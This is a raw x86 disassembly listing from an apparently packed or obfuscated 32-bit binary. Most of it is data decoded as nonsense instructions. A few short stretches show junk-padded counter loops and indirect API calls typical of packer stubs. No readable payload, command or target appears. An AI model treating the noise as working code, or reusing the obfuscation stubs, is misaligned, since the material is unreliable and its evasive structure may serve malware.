  409ada:	pop    esi
  409adb:	push   edx
  409adc:	pop    eax
  409add:	dec    esp
  409ade:	test   DWORD PTR [esi+0x61],0x8350c3e1
  409ae5:	repnz and BYTE PTR [ebx+0x19],bl
  409ae9:	jg     0x409b03
  409aeb:	add    DWORD PTR [ebx],0x2622e719
  409af1:	xchg   edi,eax
  409af2:	mov    DWORD PTR [ecx+edx*8-0xbf5fb37],ecx
  409af9:	jo     0x409ad5
  409afb:	add    al,0x82
  409afd:	ret    
  409afe:	pop    es
  409aff:	lahf   
  409b00:	bound  ebp,QWORD PTR [eax]
  409b02:	imul   ebx,ecx,0x3c606cc
  409b08:	jbe    0x409b2c
  409b0a:	add    BYTE PTR ds:0xd3199974,dh
  409b10:	lods   eax,DWORD PTR ds:[esi]
  409b11:	and    edx,DWORD PTR [edx+0x7b]
  409b14:	outs   dx,DWORD PTR ds:[esi]
  409b15:	jae    0x409b76
  409b17:	aam    0xc
  409b19:	jecxz  0x409afb
  409b1b:	(bad)  
  409b1c:	xor    BYTE PTR [eax+0x64],dh
  409b1f:	or     BYTE PTR ds:0x4158ae16,bh
  409b25:	xor    ebp,ecx
  409b27:	(bad)  
  409b28:	fld    DWORD PTR [edi-0x45]
  409b2b:	retf   0xb2e4
  409b2e:	pop    eax
  409b2f:	sub    al,0x6f
  409b31:	push   0x7f6feee4
  409b36:	arpl   WORD PTR [ecx+edx*8-0x1a],cx
  409b3a:	fstp   DWORD PTR [ebx]
  409b3c:	or     dl,BYTE PTR [ebx-0x1eb3eb74]
  409b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b43:	dec    ecx
  409b44:	sub    eax,0xa29ae33c
  409b49:	cmp    eax,0x4a166664
  409b4e:	outs   dx,BYTE PTR ds:[esi]
  409b4f:	cld    
  409b50:	call   0xf36e:0xf554dca6
  409b57:	or     esi,DWORD PTR [eax-0x17e64a6f]
  409b5d:	adc    ecx,DWORD PTR [eax+eax*4-0x320e2b03]
  409b64:	ja     0x409b2a
  409b66:	cmp    al,0x20
  409b68:	sbb    eax,0xa5cd624a
  409b6d:	gs push ebp
  409b6f:	and    al,0x81
  409b71:	sbb    DWORD PTR ds:0xe70b9908,ebp
  409b77:	(bad)  [ebp+0x6f]
  409b7a:	ficomp DWORD PTR [edi+0x3b]
  409b7d:	cmp    eax,0xb71a6b90
  409b82:	lods   al,BYTE PTR ds:[esi]
  409b83:	inc    edi
  409b84:	jmp    0x409b13
  409b86:	mov    dl,0xe2
  409b88:	dec    edi
  409b89:	add    edx,DWORD PTR [eax+0x50715b59]
  409b8f:	mov    bh,bl
  409b91:	(bad)  
  409b92:	repz pop ecx
  409b94:	cld    
  409b95:	lahf   
  409b96:	and    edi,esp
  409b98:	adc    edi,esi
  409b9a:	jae    0x409b9d
  409b9c:	aad    0x4
  409b9e:	mov    DWORD PTR [eax],eax
  409ba0:	or     BYTE PTR ds:0x155676f3,bh
  409ba6:	and    esp,DWORD PTR [ecx-0x1b]
  409ba9:	pop    esi
  409baa:	je     0x409c02
  409bac:	pop    ebx
  409bad:	sbb    eax,0x4a49fbc7
  409bb2:	mov    edi,0xa7308f1f
  409bb7:	lea    esi,[edx]
  409bb9:	add    dl,ah
  409bbb:	sub    al,0x5e
  409bbd:	cs aad 0x59
  409bc0:	imul   ebx,DWORD PTR [esi-0x77],0xffffffd1
  409bc4:	inc    edx
  409bc5:	jp     0x409b5b
  409bc7:	fs mov dh,0x89
  409bca:	push   es
  409bcb:	dec    ecx
  409bcc:	test   al,0x3b
  409bce:	call   0xa8b2154a
  409bd3:	cmc    
  409bd4:	(bad)  
  409bd6:	sub    eax,DWORD PTR [ebx-0x47]
  409bd9:	loop   0x409bbd
  409bdb:	add    DWORD PTR [edx+eax*1+0x16],eax
  409bdf:	out    dx,al
  409be0:	mov    dh,0xe7
  409be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409be3:	rep lods al,BYTE PTR ds:[esi]
  409be5:	lods   eax,DWORD PTR ds:[esi]
  409be6:	cwde   
  409be7:	retf   0x7c22
  409bea:	sub    DWORD PTR [edx-0x2b],eax
  409bed:	xchg   ecx,eax
  409bee:	repnz aaa 
  409bf0:	jg     0x409bb2
  409bf2:	pop    DWORD PTR [edx+0x7f]
  409bf5:	push   cs
  409bf6:	and    edx,ecx
  409bf8:	xchg   edi,eax
  409bf9:	imul   eax,DWORD PTR [eax+0x46],0x7fce3326
  409c00:	in     eax,dx
  409c01:	inc    edi
  409c02:	push   ss
  409c03:	pop    ebx
  409c04:	in     eax,dx
  409c05:	shr    BYTE PTR [ebx],1
  409c07:	jno    0x409c2c
  409c09:	or     al,0x4b
  409c0b:	sbb    ch,BYTE PTR [eax+0xe]
  409c0e:	dec    eax
  409c0f:	jle    0x409c6e
  409c11:	sbb    eax,0xddcd0f3d
  409c16:	add    dh,BYTE PTR [eax+0x5e11021b]
  409c1c:	int3   
  409c1d:	jge    0x409c93
  409c1f:	or     al,0x6b
  409c21:	call   0xe8af:0x11738c
  409c28:	arpl   di,sp
  409c2a:	sahf   
  409c2b:	cmp    eax,0x8b177423
  409c30:	jmp    FWORD PTR [ecx]
  409c32:	xlat   BYTE PTR ds:[ebx]
  409c33:	mov    esi,0x47a111bc
  409c38:	icebp  
  409c39:	cmp    dh,BYTE PTR [ecx+0x3a9a42c1]
  409c3f:	inc    ebx
  409c40:	pop    esi
  409c41:	test   eax,0xe07eb05d
  409c47:	xchg   ebx,eax
  409c48:	cdq    
  409c49:	jp     0x409c4a
  409c4b:	daa    
  409c4c:	pop    ebx
  409c4d:	push   ebp
  409c4e:	push   esp
  409c4f:	mov    ah,0xbf
  409c51:	inc    edi
  409c52:	out    0xc8,eax
  409c54:	cli    
  409c55:	xor    esi,DWORD PTR [esi-0x6f]
  409c58:	jge    0x409c07
  409c5a:	mov    eax,0x12692e0b
  409c5f:	das    
  409c60:	inc    edx
  409c61:	pop    eax
  409c62:	not    DWORD PTR [edi-0x58]
  409c65:	xchg   ebx,ecx
  409c67:	shl    DWORD PTR [ebp-0x4d66de3],cl
  409c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c6e:	adc    al,0xd0
  409c70:	and    edi,DWORD PTR [esi]
  409c72:	das    
  409c73:	and    DWORD PTR [esi-0x623aa55],edx
  409c79:	aad    0x39
  409c7b:	pop    edi
  409c7c:	cmp    eax,0x4ad66236
  409c81:	xlat   BYTE PTR ds:[ebx]
  409c82:	dec    eax
  409c83:	jg     0x409c95
  409c85:	sbb    bh,BYTE PTR [ebp+eax*8+0x597c003c]
  409c8c:	pop    esp
  409c8d:	and    BYTE PTR [edx-0x348ae6c7],ah
  409c93:	adc    edi,0xa5db2e04
  409c99:	mov    BYTE PTR [esi+0x38],bl
  409c9c:	nop
  409c9d:	adc    DWORD PTR [edi+0x34],0x44e8c3be
  409ca4:	repz push ds
  409ca6:	add    edi,0x66e44f54
  409cac:	sub    eax,0x11eaaf8c
  409cb1:	mov    WORD PTR [edx-0x1ffed0f9],?
  409cb7:	or     BYTE PTR [ebp+0x28d23ca0],dl
  409cbd:	in     eax,0x2a
  409cbf:	cmovl  esi,DWORD PTR [ecx]
  409cc2:	or     ebp,DWORD PTR [edx-0x40]
  409cc5:	into   
  409cc6:	call   0x934d:0x21f849ac
  409ccd:	mov    DWORD PTR [esi],eax
  409ccf:	(bad)  
  409cd0:	sbb    cl,dl
  409cd2:	(bad)  
  409cd3:	and    WORD PTR [ebx+0x17e53721],ax
  409cda:	add    DWORD PTR [ecx+0x20063685],0x54730f9e
  409ce4:	mov    ds:0x1bfbfd5e,al
  409ce9:	out    0x7c,al
  409ceb:	inc    eax
  409cec:	inc    eax
  409ced:	mov    ?,WORD PTR [edi]
  409cef:	jecxz  0x409d67
  409cf1:	stos   DWORD PTR es:[edi],eax
  409cf2:	pop    esp
  409cf3:	push   dx
  409cf5:	rcl    BYTE PTR [eax],cl
  409cf7:	test   BYTE PTR [ecx-0x49],ah
  409cfa:	pop    es
  409cfb:	mov    ebx,0xc9a978f0
  409d00:	lods   al,BYTE PTR ds:[esi]
  409d01:	lock imul ebx,eax,0xdfdbe83e
  409d08:	xor    DWORD PTR [edi],edx
  409d0a:	pop    ecx
  409d0b:	mov    ebp,0x7b79f0ea
  409d10:	adc    ebp,DWORD PTR [edi]
  409d12:	and    al,0x15
  409d14:	scas   eax,DWORD PTR es:[edi]
  409d15:	mov    cl,0xc0
  409d17:	out    0xe1,eax
  409d19:	adc    ah,BYTE PTR [esi+0x60]
  409d1c:	xor    al,0xbb
  409d1e:	sbb    ebx,DWORD PTR [esi+0x6ed0301e]
  409d24:	xlat   BYTE PTR ds:[ebx]
  409d25:	outs   dx,BYTE PTR ds:[esi]
  409d26:	mov    ebp,0x81f9332a
  409d2b:	jl     0x409ccd
  409d2d:	cmp    al,0xec
  409d2f:	xchg   esp,eax
  409d30:	dec    ecx
  409d31:	cmp    eax,0x508fe7a3
  409d36:	pop    edi
  409d37:	dec    edi
  409d38:	mov    ds:0x844e3462,al
  409d3d:	mov    fs,WORD PTR [bp+0x534a]
  409d42:	and    DWORD PTR [esi+0x4d6d3f73],esi
  409d48:	js     0x409d71
  409d4a:	in     al,dx
  409d4b:	dec    esp
  409d4c:	cmc    
  409d4d:	iret   
  409d4e:	sub    DWORD PTR [ecx-0x5004ab70],esi
  409d54:	cdq    
  409d55:	push   ss
  409d56:	and    DWORD PTR [ebx],esp
  409d58:	sbb    eax,0x4fbdc30b
  409d5d:	lock cmp edi,ebx
  409d60:	sub    eax,0xc3136624
  409d65:	dec    BYTE PTR [esi-0x60185142]
  409d6b:	cwde   
  409d6c:	icebp  
  409d6d:	sbb    ebx,ecx
  409d6f:	adc    al,0xf8
  409d71:	cmp    DWORD PTR [ebp+0x3b],ecx
  409d74:	mov    edx,0xe9941cd6
  409d79:	cmc    
  409d7a:	repnz mov edi,0xd4daca05
  409d80:	icebp  
  409d81:	ror    BYTE PTR [esi],cl
  409d83:	ja     0x409da0
  409d85:	(bad)  
  409d86:	xor    eax,0x2e5a197d
  409d8b:	(bad)  
  409d8c:	sub    al,0xd3
  409d8e:	xor    BYTE PTR [ecx-0x19],ah
  409d91:	xchg   edx,eax
  409d92:	add    BYTE PTR [edx+0x362bedaa],bh
  409d98:	push   es
  409d99:	push   0x3c5c46b7
  409d9e:	dec    ebp
  409d9f:	adc    al,0x7
  409da1:	outs   dx,DWORD PTR ds:[esi]
  409da2:	jl     0x409dd1
  409da4:	add    DWORD PTR [ecx],0xb1db8f96
  409daa:	in     al,0x54
  409dac:	mov    al,ds:0x2a5fb9e0
  409db1:	pop    ss
  409db2:	push   0xffffffbd
  409db4:	xor    DWORD PTR [ebp+ebx*4-0x36],edi
  409db8:	cs jg  0x409d6e
  409dbb:	mov    dh,0x8e
  409dbd:	aaa    
  409dbe:	inc    ecx
  409dbf:	cmp    ebp,DWORD PTR [eax]
  409dc1:	jbe    0x409da4
  409dc3:	(bad)  
  409dc4:	pop    esp
  409dc5:	push   ds
  409dc6:	pop    esp
  409dc7:	adc    BYTE PTR [esi-0x6f3a726f],bh
  409dcd:	dec    esp
  409dce:	pop    edi
  409dcf:	pop    edi
  409dd0:	in     eax,0x2d
  409dd2:	dec    esp
  409dd3:	fild   WORD PTR [edx-0x25]
  409dd6:	ins    BYTE PTR es:[edi],dx
  409dd7:	neg    ah
  409dd9:	bnd js 0x409d78
  409ddc:	mov    esp,0x3d18a13
  409de1:	push   0xffffffd1
  409de3:	or     DWORD PTR [edx],edi
  409de5:	lea    edx,[ebx+0x67]
  409de8:	pop    ecx
  409de9:	dec    eax
  409dea:	pop    ss
  409deb:	in     eax,dx
  409dec:	stos   BYTE PTR es:[edi],al
  409ded:	pop    ecx
  409dee:	cmc    
  409def:	bound  edx,QWORD PTR [esi+0x1d7e5a83]
  409df5:	cmp    al,ch
  409df7:	fwait
  409df8:	push   0x7a
  409dfa:	and    DWORD PTR [edx+0x781c1c9f],0xffffffcb
  409e01:	stc    
  409e02:	rcl    DWORD PTR [ecx],cl
  409e04:	cld    
  409e05:	xchg   DWORD PTR [ebx],eax
  409e07:	shl    DWORD PTR [ecx],1
  409e09:	or     eax,0x42fd8a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	ins    BYTE PTR es:[edi],dx
  409e82:	mov    BYTE PTR [edx+0x19],dh
  409e85:	es call 0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	loop   0x409e5d
  409e8f:	dec    edx
  409e90:	jnp    0x409e3a
  409e92:	mov    dl,0xea
  409e94:	in     al,dx
  409e95:	add    DWORD PTR [ebx-0x5f],edi
  409e98:	aam    0x12
  409e9a:	push   esi
  409e9b:	in     eax,dx
  409e9c:	mov    esi,0x2230641e
  409ea1:	das    
  409ea2:	mov    cl,0xae
  409ea4:	mov    esi,0x365f7b94
  409ea9:	mov    ebp,0x8f42b09a
  409eae:	cmp    BYTE PTR [esi],bl
  409eb0:	cs fs jns 0x409ec8
  409eb4:	cmp    esp,ebp
  409eb6:	inc    ebp
  409eb7:	sahf   
  409eb8:	add    ebp,edx
  409eba:	in     al,dx
  409ebb:	popa   
  409ebc:	iret   
  409ebd:	sar    DWORD PTR [ebp+0x33f4f935],1
  409ec3:	shl    BYTE PTR [ebx],1
  409ec5:	(bad)  
  409ec6:	mov    esp,0x8c15dde3
  409ecb:	out    0x41,eax
  409ecd:	cmc    
  409ece:	mov    al,ds:0xe45096c9
  409ed3:	jp     0x409efc
  409ed5:	adc    dl,BYTE PTR [edx+0x6a1c692e]
  409edb:	pop    ecx
  409edc:	retf   0x915f
  409edf:	xchg   edi,eax
  409ee0:	ror    cl,cl
  409ee2:	xor    eax,0x904fc472
  409ee7:	imul   ebx,edx,0x479d308d
  409eed:	add    ecx,DWORD PTR [ecx+0x37]
  409ef0:	pop    esp
  409ef1:	in     al,dx
  409ef2:	jbe    0x409f5d
  409ef4:	clc    
  409ef5:	push   cs
  409ef6:	setae  BYTE PTR [esi-0x5979ce1a]
  409efd:	popf   
  409efe:	xor    DWORD PTR [ecx-0x93f92f9],ebp
  409f04:	xchg   esi,eax
  409f05:	ds loop 0x409f19
  409f08:	jbe    0x409ebf
  409f0a:	jnp    0x409f59
  409f0c:	mov    eax,ds:0x20ad0645
  409f11:	(bad)  
  409f12:	mov    DWORD PTR [esi-0x207f6973],0x429098bb
  409f1c:	repz repz retf 0x178
  409f21:	fmul   DWORD PTR [edi+ebp*1-0x5ce2859e]
  409f28:	popf   
  409f29:	lods   eax,DWORD PTR ds:[esi]
  409f2a:	sub    bl,BYTE PTR [esi]
  409f2c:	xor    BYTE PTR [ecx-0xc24d0e5],0xa8
  409f33:	add    edx,esp
  409f35:	cmp    eax,0x1a69018f
  409f3a:	pcmpeqd mm1,QWORD PTR [ecx-0x66]
  409f3e:	in     eax,dx
  409f3f:	xchg   edi,eax
  409f40:	nop
  409f41:	xor    al,0x68
  409f43:	or     BYTE PTR [edi-0x2bd6e11d],bh
  409f49:	cmp    al,0xb
  409f4b:	adc    eax,0x5267719c
  409f50:	lea    ebx,[ecx]
  409f52:	stos   BYTE PTR es:[edi],al
  409f53:	cmp    DWORD PTR [ebx],0xe8f1b09d
  409f59:	ds pop ebx
  409f5b:	add    dl,BYTE PTR [ebx]
  409f5d:	sbb    eax,0xfd6e8eb
  409f62:	mov    ebx,DWORD PTR [esi+0x7fc4c11b]
  409f68:	test   DWORD PTR [edi],0xcc159cf2
  409f6e:	push   edx
  409f6f:	out    0x83,al
  409f71:	mov    dl,0x54
  409f73:	push   edi
  409f74:	and    ecx,eax
  409f76:	js     0x409f00
  409f78:	cli    
  409f79:	mov    al,ds:0x43e2d096
  409f7e:	xchg   BYTE PTR [ebx],al
  409f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f81:	imul   edi,ecx,0xffffffb8
  409f84:	bound  ecx,QWORD PTR [edx+0x47f04971]
  409f8a:	aad    0xc4
  409f8c:	jg     0x409fdf
  409f8e:	cmp    eax,0x5c397dba
  409f93:	mov    cl,0x11
  409f95:	cli    
  409f96:	mov    cl,0x69
  409f98:	addr16 push esp
  409f9a:	out    0xec,eax
  409f9c:	dec    ecx
  409f9d:	pop    es
  409f9e:	pop    ebp
  409f9f:	(bad)  
  409fa0:	fmul   DWORD PTR [esi+0x4c]
  409fa3:	add    edx,DWORD PTR [edi+0x6]
  409fa6:	and    edx,ecx
  409fa8:	addr16 push ds
  409faa:	out    0x33,eax
  409fac:	ret    0xc005
  409faf:	cmp    edx,ebx
  409fb1:	xor    DWORD PTR [edx],0x7168eec8
  409fb7:	stos   BYTE PTR es:[edi],al
  409fb8:	inc    esp
  409fb9:	mov    cl,0x85
  409fbb:	(bad)  
  409fbd:	cmc    
  409fbe:	xchg   ecx,eax
  409fbf:	or     esp,edi
  409fc1:	xchg   BYTE PTR [ecx-0x4c474cf0],ch
  409fc7:	cs xor eax,0x18e44c51
  409fcd:	neg    BYTE PTR [ebp+eax*2+0x70]
  409fd1:	rol    DWORD PTR [ebp+edi*1-0x5522695a],cl
  409fd8:	dec    edi
  409fd9:	push   edi
  409fda:	sub    al,0x8e
  409fdc:	push   es
  409fdd:	mov    ebx,0xc246b39c
  409fe2:	fcomp  QWORD PTR cs:[ebx]
  409fe5:	inc    ebx
  409fe6:	pop    ecx
  409fe7:	ins    BYTE PTR es:[edi],dx
  409fe8:	xor    eax,esp
  409fea:	jp     0x40a003
  409fec:	adc    DWORD PTR [ebx+0x592ad0af],0x1a88930b
  409ff6:	jbe    0x40a069
  409ff8:	mov    ebx,0x707c41a5
  409ffd:	push   cs
  409ffe:	xor    al,0xa
  40a000:	popf   
  40a001:	or     al,0xd4
  40a003:	frstor [eax+0x36178d86]
  40a009:	mov    ebp,0xe9d61d7f
  40a00e:	fimul  DWORD PTR [edx+0x1]
  40a011:	call   0xefb7:0xa28c5e25
  40a018:	nop
  40a019:	sbb    esi,DWORD PTR [esi]
  40a01b:	dec    ebx
  40a01c:	loope  0x40a016
  40a01e:	add    dl,ah
  40a020:	inc    ebx
  40a021:	jmp    0x40a02f
  40a023:	sbb    DWORD PTR [eax],ebp
  40a025:	inc    edi
  40a026:	adc    cl,cl
  40a028:	xchg   ecx,eax
  40a029:	sub    BYTE PTR [ebx+0x61],bl
  40a02c:	lods   al,BYTE PTR ds:[esi]
  40a02d:	std    
  40a02e:	shr    DWORD PTR [eax],1
  40a030:	xor    ch,BYTE PTR [edx+0xe7f8b60]
  40a036:	in     al,dx
  40a037:	jmp    0x983b0d48
  40a03c:	fwait
  40a03d:	setbe  BYTE PTR [ecx]
  40a040:	push   ecx
  40a041:	mov    eax,0xa06f4b7d
  40a046:	mov    ds:0x18c5a532,eax
  40a04b:	add    al,0x3a
  40a04d:	dec    ebp
  40a04e:	das    
  40a04f:	sub    al,BYTE PTR [edi]
  40a051:	sbb    ecx,DWORD PTR [edi]
  40a053:	mov    eax,ds:0xe881a421
  40a058:	inc    edx
  40a059:	repz jge 0x40a0b8
  40a05c:	cmc    
  40a05d:	lds    eax,FWORD PTR [eax]
  40a05f:	xor    eax,0xa37659a7
  40a064:	bound  ebp,QWORD PTR [esi]
  40a066:	jae    0x40a08d
  40a068:	retf   0xfb6a
  40a06b:	sti    
  40a06c:	test   eax,0x9844f685
  40a071:	stos   BYTE PTR es:[edi],al
  40a072:	or     al,0x30
  40a074:	sub    edx,DWORD PTR [eax+ebp*1+0x7aff178b]
  40a07b:	jo     0x40a061
  40a07d:	rol    DWORD PTR [edx],1
  40a07f:	mov    al,0xf0
  40a081:	popf   
  40a082:	pop    ss
  40a083:	imul   edx,DWORD PTR [esi],0xffffffdc
  40a086:	add    al,0x70
  40a088:	push   0x5b
  40a08a:	ror    BYTE PTR [eax+eiz*2],1
  40a08d:	into   
  40a08e:	mov    edx,0x1eadf1f6
  40a093:	int    0xe3
  40a095:	xlat   BYTE PTR ds:[ebx]
  40a096:	mov    eax,ds:0x8453351e
  40a09b:	jl     0x40a0b2
  40a09d:	or     esp,DWORD PTR [esi+0x3a8053e8]
  40a0a3:	mov    ebx,0xbe2971ec
  40a0a8:	std    
  40a0a9:	stc    
  40a0aa:	xlat   BYTE PTR ds:[ebx]
  40a0ab:	loope  0x40a107
  40a0ad:	xor    al,0x59
  40a0af:	nop
  40a0b0:	adc    DWORD PTR [eax+eiz*8+0x59],ecx
  40a0b4:	cmp    al,0x38
  40a0b6:	xchg   BYTE PTR [ebx+ebx*2+0x45],cl
  40a0ba:	and    BYTE PTR [eax],bh
  40a0bc:	test   BYTE PTR [edi],bl
  40a0be:	call   0x16ef:0x4b52b500
  40a0c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0c6:	mov    edx,ecx
  40a0c8:	pop    ebx
  40a0c9:	push   edx
  40a0ca:	pushf  
  40a0cb:	adc    BYTE PTR gs:[esi],ch
  40a0ce:	mov    esi,0x5d11be8e
  40a0d3:	jmp    0x40a0da
  40a0d5:	mov    bl,0x22
  40a0d7:	test   al,0xe3
  40a0d9:	test   DWORD PTR [ebp+0xe],ebx
  40a0dc:	cmp    al,0x4b
  40a0de:	or     ah,BYTE PTR [edx]
  40a0e0:	sub    edx,DWORD PTR [eax]
  40a0e2:	fst    QWORD PTR ds:0x84483fcd
  40a0e8:	jp     0x40a0e6
  40a0ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0eb:	out    0x68,eax
  40a0ed:	xchg   ebx,eax
  40a0ee:	ja     0x40a15a
  40a0f0:	adc    BYTE PTR [edi*1+0x2b14dac1],bh
  40a0f7:	sbb    ebp,DWORD PTR [ecx+ebp*4+0x5f]
  40a0fb:	xor    esi,ebx
  40a0fd:	repz repz mov bh,0xd8
  40a101:	idiv   dh
  40a103:	jne    0x40a0b9
  40a105:	push   ebp
  40a106:	stc    
  40a107:	jmp    0x46f6:0x4559191d
  40a10e:	push   esp
  40a10f:	je     0x40a0f4
  40a111:	jge    0x40a182
  40a113:	dec    eax
  40a114:	pop    esp
  40a115:	imul   esp,DWORD PTR [ebp-0x576bbee],0xffffffd0
  40a11c:	mov    esp,0x819bde5c
  40a121:	out    dx,eax
  40a122:	enter  0x497,0xda
  40a126:	(bad)  
  40a127:	add    al,0x3b
  40a129:	(bad)  
  40a12a:	nop
  40a12b:	add    eax,0x89fa8e49
  40a130:	or     dh,BYTE PTR [ecx]
  40a132:	sub    DWORD PTR [esi],esi
  40a134:	fbstp  TBYTE PTR [edi]
  40a136:	jnp    0x40a14a
  40a138:	aad    0x55
  40a13a:	in     al,0x35
  40a13c:	bound  esi,QWORD PTR [edi-0x8]
  40a13f:	int3   
  40a140:	int    0x37
  40a142:	cmp    esi,DWORD PTR [ebx]
  40a144:	loope  0x40a179
  40a146:	scas   eax,DWORD PTR es:[edi]
  40a147:	test   BYTE PTR [eax-0x3ea6e00f],0xba
  40a14e:	inc    ebx
  40a14f:	xchg   esp,eax
  40a150:	dec    ebp
  40a151:	and    al,0xa0
  40a153:	out    0xc5,eax
  40a155:	sbb    eax,0x54298854
  40a15a:	push   eax
  40a15b:	push   ebp
  40a15c:	pop    eax
  40a15d:	and    eax,0x529bb96f
  40a162:	popf   
  40a163:	std    
  40a164:	test   BYTE PTR [eax-0x65],0xcd
  40a168:	aaa    
  40a169:	fld    DWORD PTR [ecx+0x16]
  40a16c:	dec    eax
  40a16d:	call   0x8186:0xb9a01568
  40a174:	outs   dx,DWORD PTR ds:[esi]
  40a175:	fcmovnu st,st(6)
  40a177:	jbe    0x40a1a9
  40a179:	loop   0x40a1df
  40a17b:	lock and eax,0x5d92d9f9
  40a181:	mov    bh,0x7c
  40a183:	aaa    
  40a184:	cld    
  40a185:	lds    ebp,FWORD PTR [edx-0xe]
  40a188:	pop    ebp
  40a189:	mov    es,ecx
  40a18b:	daa    
  40a18c:	cmp    esp,DWORD PTR [edi+edi*1]
  40a18f:	push   ecx
  40a190:	xchg   BYTE PTR [ebp+0x4c24c602],dh
  40a196:	jecxz  0x40a194
  40a198:	push   ebx
  40a199:	test   eax,0xa9731311
  40a19e:	nop
  40a19f:	fsubr  QWORD PTR [edx+0x5ed44682]
  40a1a5:	pop    esi
  40a1a6:	pop    DWORD PTR [ecx]
  40a1a8:	pop    eax
  40a1a9:	cdq    
  40a1aa:	push   ss
  40a1ab:	mov    DWORD PTR [ebp-0x229902f6],ecx
  40a1b1:	mov    dl,0x42
  40a1b3:	push   eax
  40a1b4:	sub    cl,BYTE PTR [esi+0x54494df0]
  40a1ba:	test   al,0x64
  40a1bc:	and    ebp,DWORD PTR [ebx-0x4a]
  40a1bf:	ins    DWORD PTR es:[edi],dx
  40a1c0:	mov    BYTE PTR [ebx-0x5964bd5],bl
  40a1c6:	aaa    
  40a1c7:	adc    ah,BYTE PTR [edx]
  40a1c9:	ins    BYTE PTR es:[edi],dx
  40a1ca:	pop    ds
  40a1cb:	xchg   ebp,eax
  40a1cc:	shr    BYTE PTR [esi+edi*8+0x669685bc],cl
  40a1d3:	aaa    
  40a1d4:	pop    ss
  40a1d5:	bound  ebx,QWORD PTR [ebp+0x6d]
  40a1d8:	xchg   esp,eax
  40a1d9:	sbb    ch,BYTE PTR [ebp-0x3e7cf5e1]
  40a1df:	(bad)
  40a1e2:	lock ror BYTE PTR [ecx-0x66a26e65],0x1c
  40a1ea:	das    
  40a1eb:	push   esp
  40a1ec:	push   eax
  40a1ed:	adc    BYTE PTR cs:[esi],0xc7
  40a1f1:	ins    BYTE PTR es:[edi],dx
  40a1f2:	lahf   
  40a1f3:	loope  0x40a1eb
  40a1f5:	je     0x40a199
  40a1f7:	dec    ecx
  40a1f8:	xchg   ebx,eax
  40a1f9:	mov    DWORD PTR [esi+0x68],ebx
  40a1fc:	mov    ebx,0xf483f2f2
  40a201:	dec    ebp
  40a202:	push   edi
  40a203:	enter  0xd66,0x42
  40a207:	mov    WORD PTR [edx],?
  40a209:	or     edi,DWORD PTR [ecx]
  40a20b:	add    eax,0xb4f515ea
  40a210:	hlt    
  40a211:	mov    ds:0xee0c1cf,al
  40a216:	test   BYTE PTR ds:0x24284ae1,cl
  40a21c:	or     eax,0x3cc948b7
  40a221:	test   eax,0xd12fe06a
  40a226:	adc    DWORD PTR [ecx+0x4],0xc63492ec
  40a22d:	mov    edi,es
  40a22f:	inc    ebp
  40a230:	cld    
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x312da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	mov    ebp,0x45922770
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a30c
  40a2d1:	push   ds
  40a2d2:	in     al,0x83
  40a2d4:	pop    eax
  40a2d5:	(bad)
  40a2d9:	pop    ss
  40a2da:	aam    0xa2
  40a2dc:	jp     0x40a2c4
  40a2de:	shr    BYTE PTR ds:0x9b8c26c6,0x14
  40a2e5:	mov    edi,0x1bd2ace7
  40a2ea:	sub    ebp,DWORD PTR [ebp-0x12f9e20a]
  40a2f0:	jp     0x40a33f
  40a2f2:	jno    0x40a27f
  40a2f4:	push   ebp
  40a2f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
